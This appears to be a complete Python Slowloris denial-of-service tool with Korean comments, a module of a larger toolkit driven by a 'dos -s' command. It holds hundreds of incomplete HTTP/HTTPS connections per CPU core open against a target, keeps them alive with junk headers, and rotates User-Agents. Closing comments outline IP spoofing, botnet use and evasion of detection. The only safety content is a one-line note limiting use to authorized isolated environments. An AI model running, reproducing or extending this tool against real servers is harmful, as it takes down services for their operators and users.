#!/usr/bin/env python3
"""
Slowloris DoS 테스터.

HTTP/1.1 요청 헤더를 완료하지 않은 TCP 연결 여러 개를 유지하면서
주기적으로 추가 헤더를 흘려보내는 Slowloris 동작 실험 코드. (IPv4, 루트 경로 GET /)
HTTP(평문)와 HTTPS(TLS) 둘 다 지원한다.
단독 실행(input) 및 0xCC 연동(run(tokens)) 모두 지원.
본인 소유이거나 명시적으로 허가받은 격리 환경에서만 사용할 것.
"""
import socket
import ssl
import os
import time
import random
from urllib.parse import urlparse
from multiprocessing import Process, Value, Array, Event
from colorama import Fore, Style

# ── 설정 (튜닝은 여기서만) ─────────────────────────────
PROCESS_COUNT = os.cpu_count() or 1   # 기본 프로세스 수 (cpu_count가 None이면 1)
CONNS_PER_PROC = 500                  # 기본 프로세스당 연결 수
SOCKET_TIMEOUT = 5                    # connect · TLS 핸드셰이크 · send 타임아웃(초)
KEEPALIVE_INTERVAL = 10               # 연결 유지용 헤더를 흘려보내는 간격(초)
REPORT_INTERVAL = 1                   # 집계 출력 간격(초)

# 연결마다 랜덤으로 붙이는 User-Agent — 다양한 UA에 대한 서버 로그/탐지 동작 확인용
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

# 실패 유형 카운터 (프로세스 공유 배열의 인덱스) — DNS는 시작 전에 처리하므로 제외
ERR_REFUSED = 0    # 연결 거부 (서버가 안 받음)
ERR_TIMEOUT = 1    # 타임아웃 (connect/handshake/send)
ERR_TLS = 2        # TLS 핸드셰이크 오류
ERR_OTHER = 3      # 그 외
ERR_LABELS = ["연결거부", "타임아웃", "TLS", "기타"]


def resolve_target(raw):
    """입력받은 URL/호스트/IP에서 (호스트명, IP, TLS여부, 포트)를 뽑는다. (IPv4 전용)
    경로(/path)는 무시하며, 요청은 항상 루트(GET /)로 보낸다.
    DNS 실패는 socket.gaierror로 올려보내 입력 단계에서 처리한다."""
    raw = raw.strip()
    if "://" not in raw:                 # 스킴 없으면 붙여 urlparse가 host/port/scheme 뽑게
        raw = "//" + raw
    parsed = urlparse(raw, scheme="http")
    use_tls = parsed.scheme.lower() == "https"   # 대소문자 무관
    host = parsed.hostname               # 사용자정보/포트 안전 분리
    port = parsed.port                   # 없으면 None
    if not host:
        raise ValueError("호스트를 해석할 수 없습니다")
    ip = socket.gethostbyname(host)      # 호스트명→DNS 변환, IP면 그대로 (실패 시 gaierror)
    return host, ip, use_tls, port


def make_tls_context():
    """TLS 컨텍스트 (테스트용: 인증서 검증 끔). 프로세스당 한 번만 생성해 재사용."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def build_request(host):
    """연결마다 새로 만드는 '미완성' HTTP 요청 (루트 경로).
    끝의 빈 줄(\\r\\n\\r\\n)을 일부러 안 보내 서버가 요청이 안 끝났다고 여기게 한다.
    Host 헤더에는 (IP가 아니라) 원래 호스트명을 넣어 VirtualHost로도 제대로 도달하게 한다."""
    ua = random.choice(USER_AGENTS)
    return (f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n").encode()


def classify_error(e):
    """예외를 실패 유형 인덱스로 분류 (DNS는 시작 전에 처리하므로 제외)."""
    if isinstance(e, ssl.SSLError):
        return ERR_TLS
    if isinstance(e, (socket.timeout, TimeoutError)):
        return ERR_TIMEOUT
    if isinstance(e, ConnectionRefusedError):
        return ERR_REFUSED
    return ERR_OTHER


def open_conn(host, ip, port, tls_ctx, errors):
    """연결 하나 맺고 미완성 요청 조각을 보낸 소켓 반환. 실패하면 None.
    연결은 ip로, Host 헤더에는 host를 쓴다. tls_ctx가 있으면 TLS로 감싼다.
    실패 시 유형을 errors 배열에 집계하고, 만든 소켓은 반드시 닫는다."""
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(SOCKET_TIMEOUT)
        s.connect((ip, port))
        if tls_ctx is not None:
            s = tls_ctx.wrap_socket(s, server_hostname=host)   # SNI로 host 전달
        s.sendall(build_request(host))
        return s
    except Exception as e:
        with errors.get_lock():
            errors[classify_error(e)] += 1
        if s is not None:                 # 실패한 소켓은 명시적으로 닫아 FD 누수 방지
            try:
                s.close()
            except Exception:
                pass
        return None


def worker(host, ip, port, use_tls, per_proc, counter, errors, stop_event):
    """[프로세스] per_proc개 연결을 맺고, stop_event가 켜질 때까지 유지한다.
    counter: 활성 추적 중인 소켓 수(공유). errors: 실패 유형별 카운터(공유)."""
    tls_ctx = make_tls_context() if use_tls else None
    sockets = []

    def _drop(sock):
        """소켓 하나를 닫고 counter를 정확히 감소."""
        try:
            sock.close()
        except Exception:
            pass
        with counter.get_lock():
            counter.value -= 1

    try:
        # 1) 목표 개수까지 연결을 맺어 붙잡는다
        for _ in range(per_proc):
            if stop_event.is_set():
                break
            s = open_conn(host, ip, port, tls_ctx, errors)
            if s:
                sockets.append(s)
                with counter.get_lock():
                    counter.value += 1

        # 2) stop_event가 켜질 때까지 연결 유지 — 가끔 미완성 헤더 한 줄을 흘려보냄
        while not stop_event.is_set():
            alive = []
            for s in sockets:
                try:
                    s.sendall(f"X-a: {random.randint(1, 99999)}\r\n".encode())
                    alive.append(s)       # 살아있는 것만 유지 (remove 탐색 없이 새 리스트)
                except Exception:
                    _drop(s)              # 끊긴 연결 정리
            sockets = alive

            # 끊긴 만큼 새 연결로 보충
            while len(sockets) < per_proc and not stop_event.is_set():
                ns = open_conn(host, ip, port, tls_ctx, errors)
                if not ns:
                    break                 # 서버가 안 받으면 이번 주기엔 중단
                sockets.append(ns)
                with counter.get_lock():
                    counter.value += 1

            stop_event.wait(KEEPALIVE_INTERVAL)   # 대기 중 stop_event 오면 즉시 깸
    finally:
        for s in sockets:
            _drop(s)


def reporter(counter, errors, stop_event):
    """REPORT_INTERVAL마다 추적 중인 소켓 수와 실패 유형별 누계를 출력.
    (통계용 대략치 — 읽기에 lock을 걸지 않아 순간값은 오차가 있을 수 있음)"""
    while not stop_event.is_set():
        errs = " ".join(f"{ERR_LABELS[i]}:{errors[i]}" for i in range(len(ERR_LABELS)))
        print(f"[{Fore.GREEN}+{Fore.RESET}] "
              + Fore.RED + "Dos Attack..." + Fore.RESET
              + " 추적 중 소켓: " + Fore.GREEN + str(counter.value) + Fore.RESET
              + " | 실패 " + errs)
        stop_event.wait(REPORT_INTERVAL)


def launch(host, ip, port, use_tls, processes=PROCESS_COUNT, conns=CONNS_PER_PROC):
    """프로세스들을 띄워 공격을 실행하고, stop_event 기반으로 협조적 종료한다."""
    counter = Value("i", 0)                       # 추적 중인 소켓 수
    errors = Array("i", [0] * len(ERR_LABELS))    # 실패 유형별 카운터
    stop_event = Event()                          # 협조적 종료 신호

    print(f"[*] Slowloris → {ip}:{port}")
    print(f"[*] 프로세스 {processes} × 연결 {conns} = 목표 {processes * conns}")
    print("[*] 중단: Ctrl+C")

    procs = [Process(target=worker,
                     args=(host, ip, port, use_tls, conns, counter, errors, stop_event))
             for _ in range(processes)]
    rep = Process(target=reporter, args=(counter, errors, stop_event))

    for p in procs:
        p.start()
    rep.start()

    try:
        while any(p.is_alive() for p in procs):
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[*] 중단 — 연결 정리 중...")
    finally:
        stop_event.set()          # 협조적 종료: worker들이 스스로 finally에서 소켓 정리
        for p in procs:
            p.join()
        rep.join()
        print("[*] 종료")


def help_slowloris():
    """사용법 출력."""
    print("""
============ Slowloris DoS 사용법 ============
  dos -s <url/ip> [port=N] [p=N]

  <url/ip>   대상 (http/https, IPv4)
  port=N     대상 포트          (기본: URL 기준 http 80 / https 443)
  p=N        프로세스당 연결 수  (기본: 500)
             ※ 프로세스 수는 CPU 코어 수로 자동 설정됨

  예:
    dos -s http://192.168.0.10
    dos -s https://test.local port=8443 p=1000

  동작: 미완성 HTTP 요청으로 연결을 오래 붙잡아 서버 자원을 점유(Slowloris).
        1초마다 추적 소켓 수 + 실패 유형별 통계 출력. 중단: Ctrl+C.
==============================================""")


def _parse_int(value, name):
    """port=/p= 값을 양의 정수로. 실패하면 None."""
    try:
        n = int(value)
        if n <= 0:
            print(f"[!] {name} 값은 1 이상이어야 합니다: {value}")
            return None
        return n
    except ValueError:
        print(f"[!] {name} 값이 숫자가 아닙니다: {value}")
        return None


def run(tokens):
    """0xCC 진입점. dos 명령어에서 -s(Slowloris)로 분기되어 호출됨.
    예: ['dos', '-s', 'http://192.168.0.10', 'port=80', 'p=1000']
    port·p는 생략하면 기본값. 프로세스 수는 CPU 코어 수로 자동."""
    conns = CONNS_PER_PROC     # p= (프로세스당 연결 수), 생략 시 기본
    port_opt = None            # port= (생략 시 URL/기본 포트 사용)
    target = None

    for arg in tokens[1:]:
        if arg == "-s":
            continue                       # Slowloris 모드 플래그 (이미 여기로 분기됨)
        elif arg in ("-h", "help", "--help"):
            help_slowloris()
            return
        elif arg.startswith("port="):
            port_opt = _parse_int(arg[5:], "port")
            if port_opt is None:
                return                     # 잘못된 값 → 중단 (에러는 _parse_int가 출력)
        elif arg.startswith("p="):
            conns = _parse_int(arg[2:], "p")
            if conns is None:
                return
        elif arg.startswith("-"):
            print(f"[!] 알 수 없는 옵션: {arg}")
            return
        else:
            target = arg

    if target is None:
        print("[!] 대상 URL/IP를 지정하세요 (dos -s help)")
        return

    try:
        host, ip, use_tls, url_port = resolve_target(target)
    except socket.gaierror:
        print("[!] DNS 조회 실패 — 호스트 이름을 확인하세요.")
        return
    except ValueError as e:
        print(f"[!] 입력 오류: {e}")
        return

    # 포트: 옵션(port=) > URL의 포트 > 기본(https 443 / http 80)
    if port_opt is not None:
        port = port_opt
    elif url_port is not None:
        port = url_port
    else:
        port = 443 if use_tls else 80

    scheme = "HTTPS/TLS" if use_tls else "HTTP"
    print(f"[*] 대상: {host} ({ip}):{port} [{scheme}]")
    launch(host, ip, port, use_tls, PROCESS_COUNT, conns)   # 프로세스는 CPU 수 자동


if __name__ == "__main__":
    # 단독 실행: 입력받아 실행 (0xCC 연동 시엔 run(tokens) 사용)
    target = input("대상 URL/IP (http/https, IPv4): ").strip()
    try:
        host, ip, use_tls, url_port = resolve_target(target)
    except socket.gaierror:
        print("[!] DNS 조회 실패 — 호스트 이름을 확인하세요.")
        raise SystemExit(1)
    except ValueError as e:
        print(f"[!] 입력 오류: {e}")
        raise SystemExit(1)

    if url_port is not None:
        port = url_port
    else:
        default = 443 if use_tls else 80
        port = int(input(f"포트(기본 {default}): ") or str(default))

    scheme = "HTTPS/TLS" if use_tls else "HTTP"
    print(f"[*] 대상: {host} ({ip}):{port} [{scheme}]")
    launch(host, ip, port, use_tls)

    # 발신자 IP Random으로 바꿔서 서버에 보내는거
    # 다량으로 웹서버에 POST방식으로 조작된 피라미터값을 전달한다
    # 병렬성: 단순히 한 프로세스에서 무한 루프를 돌리는 게 아니라, 수천~수만 개의 스레드나 프로세스를 동시에 실행하거나, 분산된 여러 컴퓨터(봇넷)를 활용합니다.
    # 랜덤화: 요청 헤더(User-Agent, Referer 등)를 무작위로 바꿔서 탐지 회피를 시도합니다.
    # 지속성: 단순 GET 요청만 반복하는 게 아니라, Keep-Alive 연결을 유지하거나 Slowloris처럼 응답을 지연시키는 방식도 있습니다.
    # 분산성: 한 대의 PC에서 보내는 건 금방 차단되지만, 전 세계 수많은 감염된 기기(봇넷)를 동시에 동원하면 방어가 어려워집니다.

    # 발신자 IP Random으로 바꿔서 서버에 보내는거
    # 다량으로 HTTP GET을 다량으로 요청하여 공격유발
    # 매우짦은시간에 GET요청

